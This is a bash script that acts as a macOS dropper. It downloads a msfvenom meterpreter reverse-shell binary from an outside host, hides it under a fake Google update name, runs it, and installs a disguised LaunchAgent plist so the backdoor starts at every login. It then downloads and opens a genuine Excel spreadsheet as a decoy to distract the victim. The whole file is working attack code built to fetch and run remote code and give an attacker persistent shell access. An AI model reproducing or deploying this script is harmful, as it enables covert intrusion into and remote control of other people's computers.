#!/usr/bin/env bash

# URL hosting our malicious mach-o reverse shell generated with msfvenom
# msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=dns1resolve.hopto.org LPORT=443 -f macho > osx
URL="https://dns1resolve.hopto.org:55143/osx"

# URL hosting our plist file
PLISTURL="https://dns1resolve.hopto.org:55143/plist"

# URL to download a real excel file
EXCELURL="https://www.smartsheet.com/sites/default/files/Construction-Budget-Template-IT.xlsx"

# Rename our payload macho-o name
PAYLOAD="googleupdate"

# Add dot to make hidden file
PAYLOAD=".${PAYLOAD}"

# Download malicious mach-o from ftp over ssl.
# curl --ftp-ssl -u user:pass ftp://MY_C2C_IP:21/payloads/macho
# or
# Download from https
# This payload is our persistence reverse backdoor in mach-o format!!!
curl -s -k $URL -o ~/Library/$PAYLOAD

# Want to be sure that's my payload is executable
chmod +x ~/Library/$PAYLOAD

# Launch the macho-o reverse backdoor
~/Library/$PAYLOAD &

sleep 2

# Persistence as LaunchAgents. Our backdoor will call us after user login.
# If we kill session once established, victim neeeds to log off and log in again to get another shell,
# or just reboot.
#
# Download and write backdoored plist file
curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.update.plist

# We need to replace 'replace' string on our ,plist file with correct username of our victim
# Remember that using sed on OSX will use BSD mode. So u need a backup file that will remove in second istance
USERNAME=$(whoami)
sed -i .bak "s/replace/$USERNAME/g" ~/Library/LaunchAgents/com.google.update.plist
rm ~/Library/LaunchAgents/com.google.update.plist.bak

# Download and open a real file excel
curl -s $EXCELURL -o progetto.xlsx
open progetto.xlsx
